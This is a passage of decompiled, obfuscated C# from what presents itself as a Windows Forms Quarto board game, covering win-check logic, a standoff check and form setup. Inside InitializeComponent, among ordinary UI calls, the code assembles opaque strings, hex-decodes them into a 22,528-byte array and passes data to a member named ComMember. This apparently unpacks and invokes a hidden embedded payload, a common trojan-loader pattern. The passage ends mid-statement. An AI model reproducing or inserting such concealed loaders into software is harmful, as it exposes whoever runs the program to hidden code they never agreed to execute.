						num68 = -381980151;
						num69 = -381980151;
					}
					else
					{
						num68 = -161169763;
						num69 = -161169763;
					}
					num = num68 ^ ((int)num2 * -1226343682);
					continue;
				}
				case 52u:
				{
					int num67;
					if (mem[num5, 0].Point == mem[num5, 1].Point)
					{
						num = -978043965;
						num67 = -978043965;
					}
					else
					{
						num = -1502050659;
						num67 = -1502050659;
					}
					continue;
				}
				case 51u:
				{
					int num62;
					int num63;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num62 = -460502739;
						num63 = -460502739;
					}
					else
					{
						num62 = -381473815;
						num63 = -381473815;
					}
					num = num62 ^ ((int)num2 * -1727932310);
					continue;
				}
				case 50u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = ((int)num2 * -1084021659) ^ 0x7F4A5B70;
						continue;
					}
					goto IL_0593;
				case 49u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = (int)(num2 * 296511006) ^ -195369259;
						continue;
					}
					goto IL_0035;
				case 48u:
					num32 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_011b;
				case 47u:
				{
					int num53;
					if (mem[num5, 0].Dark == mem[num5, 1].Dark)
					{
						num = -1822805134;
						num53 = -1822805134;
					}
					else
					{
						num = -659561346;
						num53 = -659561346;
					}
					continue;
				}
				case 46u:
				{
					int num45;
					int num46;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num45 = -1952564791;
						num46 = -1952564791;
					}
					else
					{
						num45 = -1733659287;
						num46 = -1733659287;
					}
					num = num45 ^ ((int)num2 * -305503249);
					continue;
				}
				case 45u:
				{
					int num39;
					int num40;
					if (mem[num5, 1].Point == mem[num5, 2].Point)
					{
						num39 = -1738665379;
						num40 = -1738665379;
					}
					else
					{
						num39 = -1502808681;
						num40 = -1502808681;
					}
					num = num39 ^ ((int)num2 * -1188656822);
					continue;
				}
				case 44u:
				{
					int num36;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = -1960941825;
						num36 = -1960941825;
					}
					else
					{
						num = -1802289071;
						num36 = -1802289071;
					}
					continue;
				}
				case 43u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -284703481) ^ 0x42436688;
						continue;
					}
					goto IL_03d9;
				case 42u:
				{
					int num28;
					int num29;
					if (mem[1, num5].Dark != mem[2, num5].Dark)
					{
						num28 = -1639964910;
						num29 = -1639964910;
					}
					else
					{
						num28 = -919765341;
						num29 = -919765341;
					}
					num = num28 ^ ((int)num2 * -1603952421);
					continue;
				}
				case 41u:
					num = ((int)num2 * -345826182) ^ 0x50276B19;
					continue;
				case 40u:
				{
					int num24;
					int num25;
					if (mem[2, 2] != null)
					{
						num24 = 91764318;
						num25 = 91764318;
					}
					else
					{
						num24 = 696572157;
						num25 = 696572157;
					}
					num = num24 ^ ((int)num2 * -592055786);
					continue;
				}
				case 39u:
					num = -1743231570;
					continue;
				case 38u:
					flag2 = false;
					num5 = 0;
					num = ((int)num2 * -883768036) ^ -1575125678;
					continue;
				case 36u:
				{
					int num17;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = -413087987;
						num17 = -413087987;
					}
					else
					{
						num = -119345601;
						num17 = -119345601;
					}
					continue;
				}
				case 35u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -607566612) ^ -888957653;
						continue;
					}
					goto IL_0305;
				case 34u:
				{
					int num6;
					int num7;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num6 = 1173776880;
						num7 = 1173776880;
					}
					else
					{
						num6 = 928844815;
						num7 = 928844815;
					}
					num = num6 ^ ((int)num2 * -1122974862);
					continue;
				}
				case 33u:
				{
					int num70;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -867809754;
						num70 = -867809754;
					}
					else
					{
						num = -1605222184;
						num70 = -1605222184;
					}
					continue;
				}
				case 32u:
					flag4 = num5 < 4;
					num = -1191672988;
					continue;
				case 31u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 651983238) ^ 0x5EE24A86);
						continue;
					}
					goto IL_011a;
				case 30u:
					if (mem[1, num5] != null)
					{
						num = ((int)num2 * -863099961) ^ 0x403D11A7;
						continue;
					}
					goto IL_01e7;
				case 29u:
					if (mem[3, num5] != null)
					{
						num = (int)((num2 * 1423914772) ^ 0x50ACCFD5);
						continue;
					}
					goto IL_01e7;
				case 28u:
				{
					int num64;
					if (mem[num5, 0] != null)
					{
						num = -1086372566;
						num64 = -1086372566;
					}
					else
					{
						num = -413087987;
						num64 = -413087987;
					}
					continue;
				}
				case 27u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = -1903324449;
						continue;
					}
					goto IL_0593;
				case 26u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 1263616932) ^ 0x7A989490);
						continue;
					}
					goto IL_03d9;
				case 25u:
				{
					int num60;
					int num61;
					if (mem[1, num5].Big != mem[2, num5].Big)
					{
						num60 = -219138792;
						num61 = -219138792;
					}
					else
					{
						num60 = -146376420;
						num61 = -146376420;
					}
					num = num60 ^ ((int)num2 * -1256415483);
					continue;
				}
				case 24u:
				{
					int num56;
					int num57;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num56 = 1891391477;
						num57 = 1891391477;
					}
					else
					{
						num56 = 1359233998;
						num57 = 1359233998;
					}
					num = num56 ^ ((int)num2 * -1637047815);
					continue;
				}
				case 22u:
				{
					int num54;
					int num55;
					if (mem[1, 1] == null)
					{
						num54 = 1260407007;
						num55 = 1260407007;
					}
					else
					{
						num54 = 1028208929;
						num55 = 1028208929;
					}
					num = num54 ^ ((int)num2 * -1958340210);
					continue;
				}
				case 21u:
					flag2 = true;
					num = (int)(num2 * 1542689686) ^ -1664524606;
					continue;
				case 20u:
				{
					int num49;
					int num50;
					if (mem[3, 3] == null)
					{
						num49 = -272047297;
						num50 = -272047297;
					}
					else
					{
						num49 = -1872523785;
						num50 = -1872523785;
					}
					num = num49 ^ ((int)num2 * -47657696);
					continue;
				}
				case 19u:
				{
					int num44;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = -2012143808;
						num44 = -2012143808;
					}
					else
					{
						num = -452555498;
						num44 = -452555498;
					}
					continue;
				}
				case 18u:
					num16 = ((mem[2, num5].Square == mem[3, num5].Square) ? 1 : 0);
					goto IL_0036;
				case 17u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -639479507) ^ 0x3D3A4522;
						continue;
					}
					goto IL_0305;
				case 16u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -851233958) ^ 0x5EDAD442;
						continue;
					}
					goto IL_014d;
				case 15u:
				{
					int num37;
					int num38;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num37 = -2082900860;
						num38 = -2082900860;
					}
					else
					{
						num37 = -2127996727;
						num38 = -2127996727;
					}
					num = num37 ^ (int)(num2 * 1171811154);
					continue;
				}
				case 14u:
				{
					int num35;
					if (mem[0, num5].Dark != mem[1, num5].Dark)
					{
						num = -213752031;
						num35 = -213752031;
					}
					else
					{
						num = -2113042133;
						num35 = -2113042133;
					}
					continue;
				}
				case 13u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = (int)((num2 * 977157238) ^ 0x74FE942D);
						continue;
					}
					goto IL_017f;
				case 12u:
					flag2 = true;
					num = ((int)num2 * -1951462022) ^ -2115610513;
					continue;
				case 11u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = (int)(num2 * 1553456262) ^ -1807962229;
						continue;
					}
					goto IL_0035;
				case 10u:
				{
					int num30;
					int num31;
					if (!flag3)
					{
						num30 = -1704572204;
						num31 = -1704572204;
					}
					else
					{
						num30 = -1263848243;
						num31 = -1263848243;
					}
					num = num30 ^ (int)(num2 * 607713106);
					continue;
				}
				case 9u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = (int)((num2 * 2023000336) ^ 0x2E9BC4FE);
						continue;
					}
					goto IL_0035;
				case 8u:
					num5++;
					num = ((int)num2 * -216311256) ^ 0x2521F911;
					continue;
				case 7u:
					if (mem[2, num5] != null)
					{
						num = (int)((num2 * 1943866577) ^ 0x1ACAB8D9);
						continue;
					}
					goto IL_01e7;
				case 6u:
				{
					int num26;
					int num27;
					if (mem[num5, 1] != null)
					{
						num26 = -590810424;
						num27 = -590810424;
					}
					else
					{
						num26 = -1190795747;
						num27 = -1190795747;
					}
					num = num26 ^ ((int)num2 * -2454846);
					continue;
				}
				case 5u:
				{
					int num22;
					int num23;
					if (mem[0, num5].Big != mem[1, num5].Big)
					{
						num22 = -141406460;
						num23 = -141406460;
					}
					else
					{
						num22 = -1041167218;
						num23 = -1041167218;
					}
					num = num22 ^ (int)(num2 * 479718088);
					continue;
				}
				case 4u:
				{
					int num18;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = -911108629;
						num18 = -911108629;
					}
					else
					{
						num = -1154065985;
						num18 = -1154065985;
					}
					continue;
				}
				case 3u:
					if (mem[0, 3] != null)
					{
						num = -1596498782;
						continue;
					}
					goto IL_03d9;
				case 2u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = ((int)num2 * -310492486) ^ 0x35EF7AC1;
						continue;
					}
					goto IL_017f;
				case 1u:
				{
					int num10;
					int num11;
					if (mem[num5, 1].Dark != mem[num5, 2].Dark)
					{
						num10 = -214835010;
						num11 = -214835010;
					}
					else
					{
						num10 = -132746774;
						num11 = -132746774;
					}
					num = num10 ^ (int)(num2 * 1075462716);
					continue;
				}
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 951961107;
						num4 = 951961107;
					}
					else
					{
						num3 = 19431122;
						num4 = 19431122;
					}
					num = num3 ^ (int)(num2 * 1794151207);
					continue;
				}
				case 23u:
					break;
				default:
					{
						return result;
					}
					IL_017f:
					num16 = 1;
					goto IL_0036;
					IL_014d:
					num32 = 0;
					goto IL_011b;
					IL_03d9:
					num32 = 0;
					goto IL_011b;
					IL_0035:
					num16 = 1;
					goto IL_0036;
					IL_011a:
					num32 = 1;
					goto IL_011b;
					IL_011b:
					flag = (byte)num32 != 0;
					num = -674276306;
					continue;
					IL_0593:
					num16 = 0;
					goto IL_0036;
					IL_01e7:
					num16 = 0;
					goto IL_0036;
					IL_0036:
					flag3 = (byte)num16 != 0;
					num = -2039471424;
					continue;
					IL_0305:
					num32 = 1;
					goto IL_011b;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num = 0;
		int num6 = default(int);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num2 = 1046391858;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x1F264837u) % 15u)
				{
				case 14u:
					num6 = 0;
					num2 = 1046078495;
					continue;
				case 13u:
					flag = false;
					num2 = (int)((num3 * 1981172291) ^ 0x4F8E025E);
					continue;
				case 12u:
					num2 = (int)(num3 * 593208100) ^ -729073638;
					continue;
				case 11u:
					num2 = ((int)num3 * -1504578228) ^ 0x178C04A4;
					continue;
				case 10u:
				{
					int num7;
					int num8;
					if (flag3)
					{
						num7 = 446183453;
						num8 = 446183453;
					}
					else
					{
						num7 = 393181788;
						num8 = 393181788;
					}
					num2 = num7 ^ (int)(num3 * 28148082);
					continue;
				}
				case 9u:
					num++;
					num2 = ((int)num3 * -38969375) ^ -358477521;
					continue;
				case 8u:
					num6++;
					num2 = 2118292922;
					continue;
				case 7u:
					flag3 = mem[num, num6] == null;
					num2 = 955903580;
					continue;
				case 4u:
				{
					int num9;
					if (num6 < 4)
					{
						num2 = 590988109;
						num9 = 590988109;
					}
					else
					{
						num2 = 407855840;
						num9 = 407855840;
					}
					continue;
				}
				case 3u:
					flag2 = num < 4;
					num2 = 1698230991;
					continue;
				case 2u:
					result = flag;
					num2 = ((int)num3 * -1520012236) ^ -205342907;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (!flag2)
					{
						num4 = 278928977;
						num5 = 278928977;
					}
					else
					{
						num4 = 1071675911;
						num5 = 1071675911;
					}
					num2 = num4 ^ (int)(num3 * 1224419914);
					continue;
				}
				case 0u:
					num2 = ((int)num3 * -1959733091) ^ 0x3DADBA65;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = -1678293643;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF2AD7881u) % 9u)
				{
				case 8u:
					num = (int)((num2 * 1971303451) ^ 0x50D68788);
					continue;
				case 7u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -782705591) ^ -1340188610;
					continue;
				case 5u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)(num2 * 1177884924) ^ -512738266;
					continue;
				case 4u:
					num = (int)((num2 * 1040705336) ^ 0x3E1E8184);
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -1274051322) ^ -633876187;
					continue;
				case 1u:
					num = ((int)num2 * -757041983) ^ -1458059154;
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -2000481069) ^ -126078567;
					continue;
				case 3u:
					break;
				default:
					Form1.smethod_32((Control)(object)label2, "");
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0017;
		}
		int num = 0;
		goto IL_008c;
		IL_0083:
		num = ((components != null) ? 1 : 0);
		goto IL_008c;
		IL_0017:
		int num2 = -1759957891;
		goto IL_005a;
		IL_005a:
		bool flag = default(bool);
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0xB85AA5F2u) % 6u)
			{
			case 5u:
				((Form)this).Dispose(disposing);
				num2 = -1770487860;
				continue;
			case 4u:
				break;
			case 3u:
				Form1.smethod_51((IDisposable)components);
				num2 = (int)((num3 * 1095552796) ^ 0x13AF6375);
				continue;
			case 2u:
			{
				int num4;
				int num5;
				if (!flag)
				{
					num4 = 836292601;
					num5 = 836292601;
				}
				else
				{
					num4 = 1072548039;
					num5 = 1072548039;
				}
				num2 = num4 ^ ((int)num3 * -511892824);
				continue;
			}
			default:
				return;
			case 1u:
				goto IL_0083;
			case 0u:
				return;
			}
			break;
		}
		goto IL_0017;
		IL_008c:
		flag = (byte)num != 0;
		num2 = -1065147590;
		goto IL_005a;
	}

	private void InitializeComponent()
	{
		//IL_0b48: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b52: Expected O, but got Unknown
		object[] object_ = default(object[]);
		byte[] array = default(byte[]);
		int num5 = default(int);
		string string_ = default(string);
		bool flag = default(bool);
		while (true)
		{
			int num = -1871741285;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x83FD0AF5u) % 125u)
				{
				case 124u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)(num2 * 319723083) ^ -1201839170;
					continue;
				case 123u:
					num = ((int)num2 * -1831121555) ^ -1002406507;
					continue;
				case 122u:
					Form1.smethod_70(ComMember, object_);
					num = (int)(num2 * 1097126629) ^ -1889655865;
					continue;
				case 121u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)((num2 * 481961920) ^ 0x3B6061BD);
					continue;
				case 120u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 821704274) ^ 0x41EF716C);
					continue;
				case 119u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -897132295) ^ 0x31C44456;
					continue;
				case 118u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 1317253761) ^ -1639747719;
					continue;
				case 117u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1955414166) ^ -411926502;
					continue;
				case 116u:
					num = (int)((num2 * 660395176) ^ 0x671EB96B);
					continue;
				case 115u:
					num = (int)(num2 * 877988924) ^ -1512064966;
					continue;
				case 114u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -158456358) ^ 0x15E686FE;
					continue;
				case 113u:
					num = ((int)num2 * -685490928) ^ 0x3E850C59;
					continue;
				case 112u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -991564461) ^ -1819187045;
					continue;
				case 111u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 1721229886) ^ -692323355;
					continue;
				case 110u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)(num2 * 1728174715) ^ -1118353721;
					continue;
				case 109u:
					num = (int)((num2 * 1104837390) ^ 0x3E3DD167);
					continue;
				case 108u:
					array = new byte[22528];
					num5 = 0;
					num = ((int)num2 * -58711871) ^ -1904592556;
					continue;
				case 107u:
					num = ((int)num2 * -8340172) ^ -325048820;
					continue;
				case 106u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1256885734) ^ -987068252;
					continue;
				case 104u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 1770355839) ^ -892275629;
					continue;
				case 103u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -1686416585) ^ -1585429478;
					continue;
				case 102u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -634477130) ^ 0x138F3AE9;
					continue;
				case 101u:
					Form1.smethod_72(timer1, 1000);
					num = (int)((num2 * 373714334) ^ 0xD9A2D37);
					continue;
				case 100u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 1066838963) ^ -650800630;
					continue;
				case 99u:
					num = (int)(num2 * 987046487) ^ -1684705976;
					continue;
				case 98u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					string_ = Veet.Sa;
					num = (int)((num2 * 2124643800) ^ 0x44E841E8);
					continue;
				case 97u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -176068985) ^ 0x47FF1662;
					continue;
				case 96u:
					num = ((int)num2 * -920091708) ^ 0x1FF4B370;
					continue;
				case 95u:
					num = (int)((num2 * 384800194) ^ 0x15755268);
					continue;
				case 93u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)((num2 * 2057428889) ^ 0x776EF74C);
					continue;
				case 92u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -233593485) ^ -1189556411;
					continue;
				case 91u:
					num = (int)((num2 * 1281103342) ^ 0x66C15C50);
					continue;
				case 90u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 13400567) ^ 0x30AFACAF);
					continue;
				case 89u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 740183185) ^ -797926334;
					continue;
				case 88u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)(num2 * 1684606558) ^ -512406997;
					continue;
				case 87u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)((num2 * 2018779370) ^ 0x4686E2EA);
					continue;
				case 86u:
					num = ((int)num2 * -706208637) ^ -286344050;
					continue;
				case 85u:
					num = (int)(num2 * 929891545) ^ -2084458571;
					continue;
				case 84u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1749623174) ^ -238104620;
					continue;
				case 83u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 2070282010) ^ 0x5F323ECE);
					continue;
				case 82u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -836297028) ^ -1520150038;
					continue;
				case 81u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1101335725) ^ 0x236EE90D);
					continue;
				case 80u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = ((int)num2 * -1198691398) ^ 0x5D560A16;
					continue;
				case 79u:
					num = ((int)num2 * -1307336914) ^ 0x11D51D3A;
					continue;
				case 78u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1303478090) ^ -532755640;
					continue;
				case 77u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)(num2 * 173325019) ^ -731646478;
					continue;
				case 76u:
					num = ((int)num2 * -38073596) ^ 0x3239EF39;
					continue;
				case 75u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -350929979) ^ -2062773013;
					continue;
				case 74u:
					num = (int)((num2 * 1004622305) ^ 0x67812FD8);
					continue;
				case 73u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -2102273662) ^ -1180091624;
					continue;
				case 72u:
					num = -2078956413;
					continue;
				case 71u:
					num = ((int)num2 * -771245473) ^ -912162881;
					continue;
				case 70u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)((num2 * 693922272) ^ 0x68BA2A22);
					continue;
				case 69u:
					num = (int)(num2 * 246209550) ^ -1537898354;
					continue;
				case 68u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -944943926) ^ 0x38EE0314;
					continue;
				case 67u:
					num = (int)(num2 * 674398068) ^ -169268335;
					continue;
				case 66u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -74019388) ^ 0x55F13560;
					continue;
				case 65u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 445246607) ^ -1144084737;
					continue;
				case 64u:
					num = (int)(num2 * 1898522215) ^ -1950654804;
					continue;
				case 63u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1423750271) ^ 0x2E3221D0;
					continue;
				case 62u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 1500098333) ^ -573190428;
					continue;
				case 61u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1169123168) ^ -1758187358;
					continue;
				case 60u:
					num = (int)((num2 * 635459903) ^ 0x16833B14);
					continue;
				case 59u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 2122946627) ^ -2017543704;
					continue;
				case 58u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)(num2 * 1797774891) ^ -1315799427;
					continue;
				case 57u:
					num = (int)((num2 * 237789724) ^ 0x6534CFB7);
					continue;
				case 56u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)(num2 * 1843276057) ^ -934218500;
					continue;
				case 55u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -28455004) ^ -975442967;
					continue;
				case 54u:
					num5++;
					num = (int)((num2 * 644361959) ^ 0x58C7239E);
					continue;
				case 53u:
					flag = num5 < 22528;
					num = -489981254;
					continue;
				case 52u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -984271957) ^ -1429350552;
					continue;
				case 51u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -817148145) ^ 0x3FB494C3;
					continue;
				case 50u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = ((int)num2 * -1664603352) ^ -1306449230;
					continue;
				case 49u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -342465108) ^ -226134695;
					continue;
				case 48u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -504878954) ^ 0x3178D40B;
					continue;
				case 47u:
					Form1.smethod_59((Control)(object)this);
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -2087327741) ^ 0x4CD7D6F2;
					continue;
				case 46u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -244572023) ^ 0x72B00F1A;
					continue;
				case 45u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 965389833) ^ -854753417;
					continue;
				case 44u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1319114310) ^ -485797721;
					continue;
				case 43u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)((num2 * 784798213) ^ 0xC43BE7F);
					continue;
				case 42u:
					num = (int)(num2 * 422085333) ^ -1508239678;
					continue;
				case 41u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					num = (int)(num2 * 846275450) ^ -670661692;
					continue;
				case 40u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					Form1.smethod_61((Control)(object)label2, "label2");
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -2007052718) ^ -711279859;
					continue;
				case 39u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)(num2 * 541495454) ^ -1988767571;
					continue;
				case 38u:
					num = ((int)num2 * -1822152299) ^ -334530664;
					continue;
				case 37u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 1426976000) ^ -1954086020;
					continue;
				case 36u:
					num = ((int)num2 * -2043750562) ^ -778197869;
					continue;
				case 35u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)(num2 * 2108604104) ^ -179918177;
					continue;
				case 34u:
					num = (int)((num2 * 1652517781) ^ 0x8FE06BC);
					continue;
				case 33u:
					num = (int)((num2 * 1243697595) ^ 0x36CEA8A9);
					continue;
				case 32u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 2022193790) ^ 0x2A770A5F);
					continue;
				case 31u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1172914867) ^ -199755921;
					continue;
				case 30u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1865989765) ^ -554292706;
					continue;
				case 29u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -2109590894) ^ -225915858;
					continue;
				case 28u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -1391402923) ^ 0x4F5C7B26;
					continue;
				case 27u:
					num = (int)((num2 * 640988858) ^ 0x1994919F);
					continue;
				case 26u:
					array[num5] = Form1.smethod_69(Form1.smethod_68(string_, num5 * 2, 2), 16);
					num = ((int)num2 * -1663626502) ^ 0x55E2063;
					continue;
				case 25u:
					num = (int)((num2 * 1535300415) ^ 0x3AE0BA9E);
					continue;
				case 24u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -34611697) ^ -854518985;
					continue;
				case 23u:
					num = ((int)num2 * -1704260093) ^ -1674807070;
					continue;
				case 22u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1908122354;
						num4 = 1908122354;
					}
					else
					{
						num3 = 1695459448;
						num4 = 1695459448;
					}
					num = num3 ^ (int)(num2 * 222597816);
					continue;
				}
				case 21u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)(num2 * 1440062364) ^ -710221597;
					continue;
				case 20u:
					num = ((int)num2 * -2128542558) ^ -1685863915;
					continue;
				case 19u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -887538591) ^ -1141970203;
					continue;
				case 18u:
					Form1.smethod_92((Control)(object)this);
					num = (int)(num2 * 1484283245) ^ -1306962657;
					continue;
				case 17u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1860431755) ^ 0x781563EF;
					continue;
				case 16u:
					num = ((int)num2 * -829121447) ^ -845834451;
					continue;
				case 15u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)((num2 * 1794989366) ^ 0x481BD91C);
					continue;
				case 14u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
